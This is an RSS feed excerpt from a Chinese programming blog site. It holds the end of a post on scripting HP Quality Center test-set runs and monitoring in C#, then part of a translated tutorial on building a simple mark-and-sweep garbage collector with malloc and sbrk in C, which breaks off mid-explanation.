machine&quot;&lt;/span&gt;).HostName.Split(&lt;span class=&quot;hljs-string&quot;&gt;'.'&lt;/span&gt;)[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;];&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;17&lt;/span&gt;                    QCtestSet[&lt;span class=&quot;hljs-string&quot;&gt;&quot;CY_USER_01&quot;&lt;/span&gt;] = applicationCreationTime;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;18&lt;/span&gt;                    Thread.Sleep(&lt;span class=&quot;hljs-number&quot;&gt;1000&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;19&lt;/span&gt;                    QCtestSet[&lt;span class=&quot;hljs-string&quot;&gt;&quot;CY_USER_02&quot;&lt;/span&gt;] = machineName;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;20&lt;/span&gt;                    Thread.Sleep(&lt;span class=&quot;hljs-number&quot;&gt;1000&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;21&lt;/span&gt;                    QCtestSet.ResetTestSet(&lt;span class=&quot;hljs-literal&quot;&gt;false&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;22&lt;/span&gt;                    Thread.Sleep(&lt;span class=&quot;hljs-number&quot;&gt;1000&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;23&lt;/span&gt;                    QCtestSet.Post();&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;24&lt;/span&gt;                    Thread.Sleep(&lt;span class=&quot;hljs-number&quot;&gt;1000&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;25&lt;/span&gt;                    QCtestSet.Refresh();&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;26&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;27&lt;/span&gt;                    Thread.Sleep(&lt;span class=&quot;hljs-number&quot;&gt;10000&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;28&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;29&lt;/span&gt;                    QCscheduler = (TDAPIOLELib.TSScheduler)QCtestSet.StartExecution(&lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;30&lt;/span&gt;                    QCscheduler.Run(QClistForTSTest);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;31&lt;/span&gt;                    Thread.Sleep(&lt;span class=&quot;hljs-number&quot;&gt;5000&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;32&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;33&lt;/span&gt;                    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;34&lt;/span&gt;                }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;35&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;catch&lt;/span&gt; (Exception ex)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;36&lt;/span&gt;                {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;37&lt;/span&gt;                    Console.WriteLine(ex.ToString());&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;38&lt;/span&gt;                    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-literal&quot;&gt;false&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;39&lt;/span&gt;                }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;40&lt;/span&gt;            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;41&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;catch&lt;/span&gt; (Exception ex)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;42&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;43&lt;/span&gt;                Console.WriteLine(ex.ToString());&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;44&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-literal&quot;&gt;false&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;45&lt;/span&gt;            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;46&lt;/span&gt;        }&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Monitor，使用QCTestExecStatus中的QCexecutionStatus作为计数器，逐个判断当前步骤是否跑完，汇总运行结果，代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs cpp&quot;&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 1&lt;/span&gt;        &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;monitorTestSet&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-built_in&quot;&gt;string&lt;/span&gt; testSetID)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 2&lt;/span&gt;        &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 3&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;try&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 4&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 5&lt;/span&gt;                QCexecutionStatus = (TDAPIOLELib.ExecutionStatus)QCscheduler.ExecutionStatus;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 6&lt;/span&gt;                QCexecutionStatus.RefreshExecStatusInfo(&lt;span class=&quot;hljs-string&quot;&gt;&quot;all&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 7&lt;/span&gt;                TDAPIOLELib.TestExecStatus QCTestExecStatus;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 8&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; checkStep = &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 9&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;while&lt;/span&gt; (checkStep &amp;lt;= QCexecutionStatus.Count)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;10&lt;/span&gt;                {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;11&lt;/span&gt;                    QCexecutionStatus.RefreshExecStatusInfo(&lt;span class=&quot;hljs-string&quot;&gt;&quot;all&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;12&lt;/span&gt;                    QCTestExecStatus = (TDAPIOLELib.TestExecStatus)QCexecutionStatus[checkStep];&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;13&lt;/span&gt;                    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (QCTestExecStatus.Message == &lt;span class=&quot;hljs-string&quot;&gt;&quot;Nothing&quot;&lt;/span&gt; || QCTestExecStatus.Message == &lt;span class=&quot;hljs-string&quot;&gt;&quot;Waiting...&quot;&lt;/span&gt; || QCTestExecStatus.Message == &lt;span class=&quot;hljs-string&quot;&gt;&quot;Connecting...&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;14&lt;/span&gt;                    {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;15&lt;/span&gt;                        Thread.Sleep(&lt;span class=&quot;hljs-number&quot;&gt;10000&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;16&lt;/span&gt;                        QCexecutionStatus.RefreshExecStatusInfo(&lt;span class=&quot;hljs-string&quot;&gt;&quot;all&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;17&lt;/span&gt;                    }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;18&lt;/span&gt;                    &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;19&lt;/span&gt;                    {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;20&lt;/span&gt;                        TDAPIOLELib.TSTest QCtestOfTestSet = (TDAPIOLELib.TSTest)QClistForTSTest[checkStep];&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;21&lt;/span&gt;                        QCtestOfTestSet.Refresh();&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;22&lt;/span&gt;                        &lt;span class=&quot;hljs-keyword&quot;&gt;switch&lt;/span&gt; (QCTestExecStatus.Message)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;23&lt;/span&gt;                        {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;24&lt;/span&gt;                            &lt;span class=&quot;hljs-keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;Completed&quot;&lt;/span&gt;:&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;25&lt;/span&gt;                                &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (QCtestOfTestSet.Status == &lt;span class=&quot;hljs-string&quot;&gt;&quot;Passed&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;26&lt;/span&gt;                                    CurrentStateBar(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Step &quot;&lt;/span&gt; + checkStep + &lt;span class=&quot;hljs-string&quot;&gt;&quot; &quot;&lt;/span&gt; + QCtestOfTestSet.Name + &lt;span class=&quot;hljs-string&quot;&gt;&quot; execution completed -&amp;gt; &quot;&lt;/span&gt; + QCtestOfTestSet.Status);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;27&lt;/span&gt;                                &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;28&lt;/span&gt;                                    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (QCtestOfTestSet.Status == &lt;span class=&quot;hljs-string&quot;&gt;&quot;Failed&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;29&lt;/span&gt;                                        CurrentStateBar(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Step &quot;&lt;/span&gt; + checkStep + &lt;span class=&quot;hljs-string&quot;&gt;&quot; &quot;&lt;/span&gt; + QCtestOfTestSet.Name + &lt;span class=&quot;hljs-string&quot;&gt;&quot; execution completed -&amp;gt; &quot;&lt;/span&gt; + QCtestOfTestSet.Status);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;30&lt;/span&gt;                                    &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;31&lt;/span&gt;                                        CurrentStateBar(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Step &quot;&lt;/span&gt; + checkStep + &lt;span class=&quot;hljs-string&quot;&gt;&quot; &quot;&lt;/span&gt; + QCtestOfTestSet.Name + &lt;span class=&quot;hljs-string&quot;&gt;&quot; execution unknown -&amp;gt; &quot;&lt;/span&gt; + QCtestOfTestSet.Status);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;32&lt;/span&gt;                                &lt;span class=&quot;hljs-keyword&quot;&gt;break&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;33&lt;/span&gt;                            &lt;span class=&quot;hljs-keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;No available hosts&quot;&lt;/span&gt;:&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;34&lt;/span&gt;                                CurrentStateBar(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Step &quot;&lt;/span&gt; + checkStep + &lt;span class=&quot;hljs-string&quot;&gt;&quot; &quot;&lt;/span&gt; + QCtestOfTestSet.Name + &lt;span class=&quot;hljs-string&quot;&gt;&quot; execution failed (No available hosts) -&amp;gt; &quot;&lt;/span&gt; + QCtestOfTestSet.Status);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;35&lt;/span&gt;                                &lt;span class=&quot;hljs-keyword&quot;&gt;break&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;36&lt;/span&gt;                            &lt;span class=&quot;hljs-keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;Cannot get RemoteAgent's ClassID for test type &amp;lt;TestType&amp;gt;&quot;&lt;/span&gt;:&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;37&lt;/span&gt;                                CurrentStateBar(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Step &quot;&lt;/span&gt; + checkStep + &lt;span class=&quot;hljs-string&quot;&gt;&quot; &quot;&lt;/span&gt; + QCtestOfTestSet.Name + &lt;span class=&quot;hljs-string&quot;&gt;&quot; Cannot get RemoteAgent's ClassID for test type &amp;lt;TestType&amp;gt; -&amp;gt; &quot;&lt;/span&gt; + QCtestOfTestSet.Status);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;38&lt;/span&gt;                                &lt;span class=&quot;hljs-keyword&quot;&gt;break&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;39&lt;/span&gt;                            &lt;span class=&quot;hljs-keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;Host connected&quot;&lt;/span&gt;:&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;40&lt;/span&gt;                                CurrentStateBar(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Step &quot;&lt;/span&gt; + checkStep + &lt;span class=&quot;hljs-string&quot;&gt;&quot; &quot;&lt;/span&gt; + QCtestOfTestSet.Name + &lt;span class=&quot;hljs-string&quot;&gt;&quot; execution failed (Host connected) -&amp;gt; &quot;&lt;/span&gt; + QCtestOfTestSet.Status);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;41&lt;/span&gt;                                &lt;span class=&quot;hljs-keyword&quot;&gt;break&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;42&lt;/span&gt;                            &lt;span class=&quot;hljs-keyword&quot;&gt;default&lt;/span&gt;:&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;43&lt;/span&gt;                                CurrentStateBar(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Step &quot;&lt;/span&gt; + checkStep + &lt;span class=&quot;hljs-string&quot;&gt;&quot; &quot;&lt;/span&gt; + QCtestOfTestSet.Name + &lt;span class=&quot;hljs-string&quot;&gt;&quot; unhandled case -&amp;gt; &quot;&lt;/span&gt; + QCtestOfTestSet.Status);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;44&lt;/span&gt;                                &lt;span class=&quot;hljs-keyword&quot;&gt;break&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;45&lt;/span&gt;                        }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;46&lt;/span&gt;                        checkStep = checkStep + &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;47&lt;/span&gt;                    }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;48&lt;/span&gt;                }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;49&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;50&lt;/span&gt;            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;51&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;catch&lt;/span&gt; (Exception ex)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;52&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;53&lt;/span&gt;                Console.WriteLine(ex.ToString());&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;54&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-literal&quot;&gt;false&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;55&lt;/span&gt;            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;56&lt;/span&gt;        }&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;至此，整个测试运行过程结束。关于收集结果中除了主线程结果刷新之外，还需要有其他线程做结果的收集和展示，否则无法实现动态实时展示，这部分代码与QC无直接关系，也暂时不展示。&lt;/p&gt;
&lt;p&gt;可以看出，本人所涉及的内容，对于测试框架来说，也仅仅是一小部分。关于其他部分，以后有时间再分拆开逐一讨论。&lt;/p&gt;
</description>
<pubDate>Thu, 27 Dec 2018 15:42:00 +0000</pubDate>
<dc:creator>泽南-Alpha</dc:creator>
<og:description>（原创文章，转载请注明出处。） 一、QC简介： Quality Center存在至今已经走过了10多个年头，名字从一开始的TD，到后来的QC，再到现在的ALM。所属公司从开始的Mercury到现在的H</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/alphaxu/p/10188187.html</dc:identifier>
</item>
<item>
<title>编程实战：C语言制作垃圾回收器 - 修语谈谈C/C++</title>
<link>http://www.cnblogs.com/2f3d/p/10188181.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/2f3d/p/10188181.html</guid>
<description>&lt;p&gt;人们似乎认为编写垃圾回收机制是很难的，是一种只有少数智者和&lt;a href=&quot;http://hboehm.info/gc/index.html&quot; target=&quot;_blank&quot;&gt;Hans Boehm(et al)&lt;/a&gt;才能理解的高深魔法。我认为编写垃圾回收最难的地方就是内存分配，这和阅读K&amp;amp;R所写的malloc样例难度是相当的。&lt;/p&gt;
&lt;p&gt;在开始之前有一些重要的事情需要说明一下：第一，我们所写的代码是基于Linux Kernel的，注意是Linux Kernel而不是GNU/Linux。第二，我们的代码是32bit的。第三，请不要直接使用这些代码。我并不保证这些代码完全正确，可能其中有一些我还未发现的小的bug，但是整体思路仍然是正确的。好了，让我们开始吧。&lt;/p&gt;
&lt;h3&gt;编写malloc&lt;/h3&gt;
&lt;p&gt;最开始，我们需要写一个内存分配器(memmory allocator)，也可以叫做内存分配函数(malloc function)。最简单的内存分配实现方法就是维护一个由空闲内存块组成的链表，这些空闲内存块在需要的时候被分割或分配。当用户请求一块内存时，一块合适大小的内存块就会从链表中被移除并分配给用户。如果链表中没有合适的空闲内存块存在，而且更大的空闲内存块已经被分割成小的内存块了或内核也正在请求更多的内存(译者注：就是链表中的空闲内存块都太小不足以分配给用户的情况)。那么此时，会释放掉一块内存并把它添加到空闲块链表中。&lt;/p&gt;
&lt;p&gt;在链表中的每个空闲内存块都有一个头(header)用来描述内存块的信息。我们的header包含两个部分，第一部分表示内存块的大小，第二部分指向下一个空闲内存块。&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;; html-script: false ]    typedef struct header{&lt;/p&gt;
&lt;p&gt;        unsigned int  size;&lt;/p&gt;
&lt;p&gt;        struct block  *next;&lt;/p&gt;
&lt;p&gt;    } header_t;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;将头(header)内嵌进内存块中是唯一明智的做法，而且这样还可以享有字节自动对齐的好处，这很重要。&lt;/p&gt;
&lt;p&gt;由于我们需要同时跟踪我们“当前使用过的内存块”和“未使用的内存块”，因此除了维护空闲内存的链表外，我们还需要一条维护当前已用内存块的链表(为了方便，这两条链表后面分别写为“空闲块链表”和“已用块链表”)。我们从空闲块链表中移除的内存块会被添加到已用块链表中，反之亦然。&lt;/p&gt;
&lt;p&gt;现在我们差不多已经做好准备来完成malloc实现的第一步了。但是再那之前，我们需要知道怎样向内核申请内存。&lt;/p&gt;
&lt;p&gt;动态分配的内存会驻留在一个叫做堆(heap)的地方，堆是介于栈(stack)和BSS(未初始化的数据段－你所有的全局变量都存放在这里且具有默认值为0)之间的一块内存。堆(heap)的内存地址起始于(低地址)BSS段的边界，结束于一个分隔地址(这个分隔地址是已建立映射的内存和未建立映射的内存的分隔线)。为了能够从内核中获取更多的内存，我们只需提高这个分隔地址。为了提高这个分隔地址我们需要调用一个叫作 sbrk 的Unix系统的系统调用，这个函数可以根据我们提供的参数来提高分隔地址，如果函数执行成功则会返回以前的分隔地址，如果失败将会返回－1。&lt;/p&gt;
&lt;p&gt;利用我们现在知道的知识，我们可以创建两个函数：morecore()和add_to_free_list()。当空闲块链表缺少内存块时，我们调用morecore()函数来申请更多的内存。由于每次向内核申请内存的代价是昂贵的，我们以页(page-size)为单位申请内存。页的大小在这并不是很重要的知识点，不过这有一个很简单解释：页是虚拟内存映射到物理内存的最小内存单位。接下来我们就可以使用add_to_list()将申请到的内存块加入空闲块链表。&lt;/p&gt;
&lt;blockquote readability=&quot;52&quot;&gt;
&lt;p&gt;; html-script: false ]/*&lt;/p&gt;
&lt;p&gt;* Scan the free list and look for a place to put the block. Basically, we're&lt;/p&gt;
&lt;p&gt;* looking for any block the to be freed block might have been partitioned from.&lt;/p&gt;
&lt;p&gt;*/&lt;/p&gt;
&lt;p&gt;static void&lt;/p&gt;
&lt;p&gt;add_to_free_list(header_t *bp)&lt;/p&gt;
&lt;p&gt;{&lt;/p&gt;
&lt;p&gt;    header_t *p;&lt;/p&gt;

&lt;p&gt;    for (p = freep; !(bp &amp;gt; p &amp;amp;&amp;amp; bp &amp;lt; p-&amp;gt;next); p = p-&amp;gt;next)&lt;/p&gt;
&lt;p&gt;        if (p &amp;gt;= p-&amp;gt;next &amp;amp;&amp;amp; (bp &amp;gt; p || bp &amp;lt; p-&amp;gt;next))&lt;/p&gt;
&lt;p&gt;            break;&lt;/p&gt;

&lt;p&gt;    if (bp + bp-&amp;gt;size == p-&amp;gt;next) {&lt;/p&gt;
&lt;p&gt;        bp-&amp;gt;size += p-&amp;gt;next-&amp;gt;size;&lt;/p&gt;
&lt;p&gt;        bp-&amp;gt;next = p-&amp;gt;next-&amp;gt;next;&lt;/p&gt;
&lt;p&gt;    } else&lt;/p&gt;
&lt;p&gt;        bp-&amp;gt;next = p-&amp;gt;next;&lt;/p&gt;

&lt;p&gt;    if (p + p-&amp;gt;size == bp) {&lt;/p&gt;
&lt;p&gt;        p-&amp;gt;size += bp-&amp;gt;size;&lt;/p&gt;
&lt;p&gt;        p-&amp;gt;next = bp-&amp;gt;next;&lt;/p&gt;
&lt;p&gt;    } else&lt;/p&gt;
&lt;p&gt;        p-&amp;gt;next = bp;&lt;/p&gt;

&lt;p&gt;    freep = p;&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;

&lt;p&gt;#define MIN_ALLOC_SIZE 4096 /* We allocate blocks in page sized chunks. */&lt;/p&gt;

&lt;p&gt;/*&lt;/p&gt;
&lt;p&gt;* Request more memory from the kernel.&lt;/p&gt;
&lt;p&gt;*/&lt;/p&gt;
&lt;p&gt;static header_t *&lt;/p&gt;
&lt;p&gt;morecore(size_t num_units)&lt;/p&gt;
&lt;p&gt;{&lt;/p&gt;
&lt;p&gt;    void *vp;&lt;/p&gt;
&lt;p&gt;    header_t *up;&lt;/p&gt;

&lt;p&gt;    if (num_units &amp;lt; MIN_ALLOC_SIZE)&lt;/p&gt;
&lt;p&gt;        num_units = MIN_ALLOC_SIZE / sizeof(header_t);&lt;/p&gt;

&lt;p&gt;    if ((vp = sbrk(num_units * sizeof(header_t))) == (void *) -1)&lt;/p&gt;
&lt;p&gt;        return NULL;&lt;/p&gt;

&lt;p&gt;    up = (header_t *) vp;&lt;/p&gt;
&lt;p&gt;    up-&amp;gt;size = num_units;&lt;/p&gt;
&lt;p&gt;    add_to_free_list (up);&lt;/p&gt;
&lt;p&gt;    return freep;&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;现在我们有了两个有力的函数，接下来我们就可以直接编写malloc函数了。我们扫描空闲块链表当遇到第一块满足要求的内存块(内存块比所需内存大即满足要求)时，停止扫描，而不是扫描整个链表来寻找大小最合适的内存块，我们所采用的这种算法思想其实就是首次适应(与最佳适应相对)。&lt;/p&gt;
&lt;p&gt;注意：有件事情需要说明一下，内存块头部结构中size这一部分的计数单位是块(Block)，而不是Byte。&lt;/p&gt;
&lt;blockquote readability=&quot;66&quot;&gt;
&lt;p&gt;; html-script: false ]    &lt;/p&gt;
&lt;p&gt;static header_t base; /* Zero sized block to get us started. */&lt;/p&gt;
&lt;p&gt;static header_t *usedp, *freep;&lt;/p&gt;
&lt;p&gt;/*&lt;/p&gt;
&lt;p&gt;* Find a chunk from the free list and put it in the used list.&lt;/p&gt;
&lt;p&gt;*/&lt;/p&gt;
&lt;p&gt;void *&lt;/p&gt;
&lt;p&gt;GC_malloc(size_t alloc_size)&lt;/p&gt;
&lt;p&gt;{&lt;/p&gt;
&lt;p&gt;    size_t num_units;&lt;/p&gt;
&lt;p&gt;    header_t *p, *prevp;&lt;/p&gt;

&lt;p&gt;    num_units = (alloc_size + sizeof(header_t) - 1) / sizeof(header_t) + 1;  &lt;/p&gt;
&lt;p&gt;    prevp = freep;&lt;/p&gt;

&lt;p&gt;    for (p = prevp-&amp;gt;next;; prevp = p, p = p-&amp;gt;next) {&lt;/p&gt;
&lt;p&gt;        if (p-&amp;gt;size &amp;gt;= num_units) { /* Big enough. */&lt;/p&gt;
&lt;p&gt;            if (p-&amp;gt;size == num_units) /* Exact size. */&lt;/p&gt;
&lt;p&gt;                prevp-&amp;gt;next = p-&amp;gt;next;&lt;/p&gt;
&lt;p&gt;            else {&lt;/p&gt;
&lt;p&gt;                p-&amp;gt;size -= num_units;&lt;/p&gt;
&lt;p&gt;                p += p-&amp;gt;size;&lt;/p&gt;
&lt;p&gt;                p-&amp;gt;size = num_units;&lt;/p&gt;
&lt;p&gt;            }&lt;/p&gt;

&lt;p&gt;            freep = prevp;&lt;/p&gt;

&lt;p&gt;            /* Add to p to the used list. */&lt;/p&gt;
&lt;p&gt;            if (usedp == NULL)  &lt;/p&gt;
&lt;p&gt;                usedp = p-&amp;gt;next = p;&lt;/p&gt;
&lt;p&gt;            else {&lt;/p&gt;
&lt;p&gt;                p-&amp;gt;next = usedp-&amp;gt;next;&lt;/p&gt;
&lt;p&gt;                usedp-&amp;gt;next = p;&lt;/p&gt;
&lt;p&gt;            }&lt;/p&gt;

&lt;p&gt;            return (void *) (p + 1);&lt;/p&gt;
&lt;p&gt;        }&lt;/p&gt;
&lt;p&gt;        if (p == freep) { /* Not enough memory. */&lt;/p&gt;
&lt;p&gt;            p = morecore(num_units);&lt;/p&gt;
&lt;p&gt;            if (p == NULL) /* Request for more memory failed. */&lt;/p&gt;
&lt;p&gt;                return NULL;&lt;/p&gt;
&lt;p&gt;        }&lt;/p&gt;
&lt;p&gt;    }&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;注意这个函数的成功与否，取决于我们第一次使用时是否使 freep = &amp;amp;base 。这点我们会在初始化函数中进行设置。&lt;/p&gt;
&lt;p&gt;尽管我们的代码完全没有考虑到内存碎片，但是它能工作。既然它可以工作，我们就可以开始下一个有趣的部分－垃圾回收！&lt;/p&gt;
&lt;h3&gt;标记和清扫&lt;/h3&gt;
&lt;p&gt;我们说过垃圾回收器会很简单，因此我们尽可能的使用简单的方法：标记和清除方式。这个算法分为两个部分：&lt;/p&gt;
&lt;p&gt;首先，我们需要扫描所有可能存在指向堆中数据(heap data)的变量的内存空间并确认这些内存空间中的变量是否指向堆中的数据。为了做到这点，对于可能内存空间中的每个字长(word-size)的数据块，我们遍历已用块链表中的内存块。如果数据块所指向的内存是在已用链表块中的某一内存块中，我们对这个内存块进行标记。&lt;/p&gt;
